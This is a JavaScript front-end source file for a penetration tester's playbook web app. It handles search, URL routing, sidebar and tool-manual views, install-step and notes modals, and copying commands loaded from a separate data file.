function applyRouteState(route = getRouteStateFromUrl()) {
    const { query, pathName, moduleName, toolName } = route;

    if (query) {
        searchBox.value = query;
        loadView(null, null, null, query, { historyMode: "none" });
    } else if (pathName) {
        loadView(pathName, moduleName || null, null, "", { historyMode: "none" });
    } else {
        showHomeBaseView({ historyMode: "none" });
    }

    if (toolName) {
        loadToolView(toolName, pathName || null, moduleName || null, { historyMode: "none" });
    } else {
        closeToolPanel({ historyMode: "none" });
    }
}

function applyInitialRoute() {
    const route = getRouteStateFromUrl();
    const hasRoute = Boolean(route.query || route.pathName || route.toolName);

    if (hasRoute) {
        applyRouteState(route);
    }

    return hasRoute;
}

function closeToolPanel(options = {}) {
    const { historyMode = "replace", renderSidebar: shouldRenderSidebar = true } = options;

    activeToolContext = {
        tool: null,
        path: null,
        module: null
    };
    detailContainer.innerHTML = "";
    updateWorkspaceLayout();
    setClearSearchState();
    syncUrlState({ historyMode });

    if (shouldRenderSidebar) {
        renderSidebar();
    }
}

function loadToolView(toolName, contextPath = null, contextModule = null, options = {}) {
    const { historyMode = "push" } = options;

    if (!hasLoadedToolManualOverrides) {
        loadToolManualOverridesInBackground();
    }

    const toolManual = getToolManual(toolName);
    const firstItem = toolManual.items[0] || null;

    activeToolContext = {
        tool: toolName,
        path: contextPath || firstItem?.path || null,
        module: contextModule || firstItem?.module || null
    };

    if (activeToolContext.path) {
        expandSidebarTo(activeToolContext.path, activeToolContext.module);
    }

    updateWorkspaceLayout();
    setClearSearchState();
    syncUrlState({ historyMode });
    renderSidebar();
    renderToolManualPage(toolName);
}

function loadView(filterPath = null, filterModule = null, filterTool = null, searchQuery = "", options = {}) {
    const query = searchQuery.trim();
    const { historyMode = "replace" } = options;

    activeView = {
        type: query
            ? "search"
            : filterPath && filterModule
                ? "module"
                : filterPath
                    ? "path"
                    : "home",
        path: filterPath,
        module: filterModule,
        tool: filterTool,
        query,
        focusedId: null,
        broadSearch: false,
        fuzzySearch: false
    };

    currentViewDB = [];
    currentToolMatches = [];
    payloadContainer.innerHTML = "";
    homeDashboard.style.display = "none";

    if (query) {
        const entrySearchResult = getSearchResults(query);
        const toolSearchResult = getToolSearchResults(query);
        currentViewDB = entrySearchResult.items;
        currentToolMatches = toolSearchResult.items.slice(0, 8);
        activeView.focusedId = currentViewDB[0]?.entryId || null;
        activeView.broadSearch = entrySearchResult.broad || toolSearchResult.broad;
        activeView.fuzzySearch = entrySearchResult.fuzzy || toolSearchResult.fuzzy;
        const sidebarAnchor = currentViewDB[0] || currentToolMatches[0]?.items?.[0];
        expandSidebarTo(sidebarAnchor?.path || null, sidebarAnchor?.module || null);

        const metaParts = [];
        if (currentViewDB.length > 0) {
            metaParts.push(pluralize(currentViewDB.length, "entry match"));
        }
        if (currentToolMatches.length > 0) {
            metaParts.push(pluralize(currentToolMatches.length, "tool match"));
        }
        if (activeView.fuzzySearch) {
            metaParts.push("fuzzy matching");
        }
        if (activeView.broadSearch) {
            metaParts.push("broader match mode");
        }
        setResultsMeta(metaParts.join(" • ") || "No matches");
        setClearSearchState(true);
    } else if (filterPath && filterModule) {
        currentViewDB = sortItemsForView(
            db.filter(item => item.path === filterPath && item.module === filterModule)
        );
        activeView.focusedId = currentViewDB[0]?.entryId || null;
        expandSidebarTo(filterPath, filterModule);
        searchBox.value = "";
        setResultsMeta(`${filterModule} • ${pluralize(currentViewDB.length, "entry")}`);
        setClearSearchState(true);
    } else if (filterPath) {
        currentViewDB = sortItemsForView(
            db.filter(item => item.path === filterPath)
        );
        activeView.focusedId = currentViewDB[0]?.entryId || null;
        expandSidebarTo(filterPath, currentViewDB[0]?.module || null);
        searchBox.value = "";
        setResultsMeta(`${filterPath} • ${pluralize(currentViewDB.length, "entry")}`);
        setClearSearchState(true);
    } else {
        showHomeBaseView({ historyMode });
        return;
    }

    updateWorkspaceLayout();
    syncUrlState({ historyMode });
    renderSidebar();

    if (activeView.type === "search") {
        if (currentToolMatches.length === 0 && currentViewDB.length === 0) {
            renderEmptyState("Try a tool name, workflow name, parameter, or flag.");
            return;
        }

        renderSearchResults(currentToolMatches, currentViewDB);
        return;
    }

    if (currentViewDB.length === 0) {
        const emptyMessage = query
            ? "Try a workflow name, a tool name, a flag, or a smaller search phrase instead of an exact command."
            : "There are no saved entries for that filter yet.";
        renderEmptyState(emptyMessage);
        return;
    }

    renderEntryResults(currentViewDB);
}

function goHome(options = {}) {
    const { historyMode = "push" } = options;
    closeToolPanel({ historyMode: "none", renderSidebar: false });
    showHomeBaseView({ historyMode });
}

function executeSearch(query) {
    const normalizedQuery = query.trim();
    searchBox.value = normalizedQuery;

    if (normalizedQuery.length > 0) {
        loadView(null, null, null, normalizedQuery, { historyMode: "push" });
    } else {
        goHome({ historyMode: "push" });
    }
}

function clearSearch() {
    if (activeView.type !== "home") {
        showHomeBaseView({ historyMode: "push" });
        return;
    }

    if (hasActiveToolPanel()) {
        closeToolPanel({ historyMode: "push" });
    }
}

function copyCommandById(entryId, button) {
    const item = currentViewDB.find(entry => entry.entryId === entryId) || db.find(entry => entry.entryId === entryId);

    if (!item) {
        return;
    }

    copyInlineText(item.command, button);
}

function copyInstallCommand(toolName, methodIndex, commandIndex, button) {
    const installation = getToolManual(toolName).installation;
    const command = installation?.methods?.[methodIndex]?.commands?.[commandIndex];

    if (!command) {
        return;
    }

    copyInlineText(command, button);
}

function buildInstallMethodMarkup(toolName, method, methodIndex) {
    const commands = method.commands || [];
    const notes = method.notes || [];
    const methodSource = method.source_url
        ? [{ label: method.source_label || "Install source", url: method.source_url }]
        : [];

    return `
        <div class="modal-block install-method">
            <div>
                <span class="modal-label">${escapeHtml(method.label || "Install method")}</span>
                ${method.description ? `<p class="sources-copy">${escapeHtml(method.description)}</p>` : ""}
            </div>
            ${commands.length > 0 ? `
                <div class="install-command-stack">
                    ${commands.map((command, commandIndex) => buildCodeShellMarkup(
                        `<code>${escapeHtml(command)}</code>`,
                        `onclick="copyInstallCommand(decodeURIComponent('${encodeInlineValue(toolName)}'), ${methodIndex}, ${commandIndex}, this)"`,
                        method.label || "Install"
                    )).join("")}
                </div>
            ` : ""}
            ${notes.length > 0 ? `
                <div class="manual-note-list">
                    ${notes.map(note => `<div class="guide-item">${escapeHtml(note)}</div>`).join("")}
                </div>
            ` : ""}
            ${methodSource.length > 0 ? buildInstallSourceLinks(methodSource) : ""}
        </div>
    `;
}

function buildInstallSourceLinks(sources = []) {
    const uniqueSources = getUniqueValuesByKey(sources, "url");
    if (uniqueSources.length === 0) {
        return "";
    }

    return `
        <div class="sources-list">
            ${uniqueSources.map(source => `
                <a class="source-link" href="${escapeHtml(source.url)}" target="_blank" rel="noreferrer">
                    <span>${escapeHtml(source.label || source.url)}</span>
                    <span class="material-symbols-outlined">open_in_new</span>
                </a>
            `).join("")}
        </div>
    `;
}

function openInstallModal(toolName) {
    const toolManual = getToolManual(toolName);
    const installation = toolManual.installation;

    modalTitle.innerText = `${toolManual.name} install steps`;

    if (!installation) {
        modalBody.innerHTML = `
            <div class="modal-block">
                <span class="modal-label">No install note</span>
                <p class="sources-copy">No non-default Kali installation steps are saved for this tool yet.</p>
            </div>
        `;
        modal.style.display = "block";
        return;
    }

    const methodSources = (installation.methods || [])
        .filter(method => method.source_url)
        .map(method => ({ label: method.source_label || "Install source", url: method.source_url }));
    const sources = getUniqueValuesByKey([...(installation.sources || []), ...methodSources], "url");

    modalBody.innerHTML = `
        <div class="modal-block">
            <span class="modal-label">${escapeHtml(installation.status || "Install note")}</span>
            ${installation.summary ? `<p class="sources-copy">${escapeHtml(installation.summary)}</p>` : ""}
            ${installation.baseline ? `<p class="sources-copy">${escapeHtml(installation.baseline)}</p>` : ""}
        </div>
        ${(installation.methods || []).map((method, methodIndex) => buildInstallMethodMarkup(toolManual.name, method, methodIndex)).join("")}
        ${sources.length > 0 ? `
            <div class="modal-block">
                <span class="modal-label">Sources</span>
                ${buildInstallSourceLinks(sources)}
            </div>
        ` : ""}
    `;
    modal.style.display = "block";
}

function showNotesModal(item) {
    const hasQuickNote = Boolean(item.help_menu || item.tip);
    const hasTags = (item.tags || []).length > 0;
    const hasFlags = (item.flags || []).length > 0;
    const hasDoc = Boolean(item.reference_url);

    modalTitle.innerText = `${item.module} • ${item.title}`;
    modalBody.innerHTML = `
        <div class="modal-block">
            <span class="modal-label">Placement</span>
            <p class="sources-copy">${escapeHtml(`${item.path} -> ${item.module} -> ${item.tool}`)}</p>
        </div>
        <div class="modal-block">
            <span class="modal-label">Entry Type</span>
            <div class="tag-row">
                <span class="tag-chip">${escapeHtml(item.type || "Entry")}</span>
                ${item.platform ? `<span class="tag-chip">${escapeHtml(item.platform)}</span>` : ""}
            </div>
        </div>
        ${hasQuickNote ? `
            <div class="modal-block">
                <span class="modal-label">Quick note</span>
                <pre>${escapeHtml(item.help_menu || item.tip)}</pre>
            </div>
        ` : ""}
        ${hasTags ? `
            <div class="modal-block">
                <span class="modal-label">Tags</span>
                <div class="tag-row">${buildTagMarkup(item.tags || [])}</div>
            </div>
        ` : ""}
        ${hasFlags ? `
            <div class="modal-block">
                <span class="modal-label">Flags spotted in example</span>
                <div class="flags-row">${item.flags.map(flag => `<span class="flag-chip">${escapeHtml(flag)}</span>`).join("")}</div>
            </div>
        ` : ""}
        ${hasDoc ? `
            <div class="modal-block">
                <span class="modal-label">Upstream docs</span>
                <a class="doc-link doc-pill" href="${escapeHtml(item.reference_url)}" target="_blank" rel="noreferrer">${escapeHtml(item.reference_label || item.tool)}</a>
            </div>
        ` : ""}
    `;
    modal.style.display = "block";
}

function openEntryNotes(entryId) {
    const item = currentViewDB.find(entry => entry.entryId === entryId) || db.find(entry => entry.entryId === entryId);
    if (item) {
        showNotesModal(item);
    }
}

function openToolGuide(toolName) {
    loadToolView(toolName);
}

function openSourcesModal() {
    modalTitle.innerText = "Research sources";
    modalBody.innerHTML = `
        <div class="modal-block">
            <span class="modal-label">Source set</span>
            <p class="sources-copy">${escapeHtml(appMeta.sources_intro || "This playbook groups the saved snippets around practical methodology references and upstream tool documentation.")}</p>
            <div class="sources-list">
                ${(appMeta.sources || [])
                    .map(source => `
                        <a class="source-link" href="${escapeHtml(source.url)}" target="_blank" rel="noreferrer">
                            <span>${escapeHtml(source.label)}</span>
                            <span class="material-symbols-outlined">open_in_new</span>
                        </a>
                    `)
                    .join("")}
            </div>
        </div>
    `;
    modal.style.display = "block";
}

function closeModal() {
    modal.style.display = "none";
}

function isEditableElement(element) {
    if (!(element instanceof HTMLElement)) {
        return false;
    }

    const tagName = element.tagName;
    return element.isContentEditable
        || tagName === "INPUT"
        || tagName === "TEXTAREA"
        || tagName === "SELECT";
}

window.addEventListener("click", event => {
    if (event.target === modal) {
        closeModal();
    }
});

window.addEventListener("popstate", () => {
    applyRouteState(getRouteStateFromUrl());
});

searchBox.addEventListener("input", event => {
    const query = event.target.value.trim();
    if (query.length > 0) {
        // Keep the live filter responsive without rewriting the URL on every keystroke.
        loadView(null, null, null, query, { historyMode: "none" });
    } else {
        showHomeBaseView({ historyMode: "replace" });
    }
});

searchBox.addEventListener("keydown", event => {
    if (event.key === "Enter") {
        event.preventDefault();
        executeSearch(event.target.value);
    }
});

document.addEventListener("keydown", event => {
    if (
        event.key === "/"
        && !event.ctrlKey
        && !event.metaKey
        && !event.altKey
        && !isEditableElement(document.activeElement)
    ) {
        event.preventDefault();
        searchBox.focus();
        searchBox.select();
    }

    if (event.key === "Escape") {
        if (modal.style.display === "block") {
            closeModal();
        } else if (searchBox.value.trim().length > 0) {
            clearSearch();
        } else if (hasActiveToolPanel()) {
            closeToolPanel({ historyMode: "push" });
        }
    }
});

injectManualButtonStyles();
applyTheme(currentModeIndex);
applySidebarState();

fetchJsonFile("data.json")
    .then(data => {
        if (Array.isArray(data)) {
            appMeta = {
                title: "my pl4yb00k",
                subtitle: "A pentester's playbook for fast tool lookup, practical workflows, and clean notes across manuals, flags, and examples.",
                disclaimer: "Use only on systems you own or are explicitly authorized to assess."
            };
            hydrateMeta(appMeta);
            db = annotateEntries(data);
        } else {
            hydrateMeta(data.meta || {});
            db = annotateEntries(data.entries || []);
        }

        buildNavTree();
        buildToolManualIndex();
        renderSidebar();
        renderHomeDashboard();
        if (!applyInitialRoute()) {
            showHomeBaseView({ historyMode: "replace" });
        }
        loadToolManualOverridesInBackground();
    })
    .catch(error => {
        renderLoadError(error);
    });
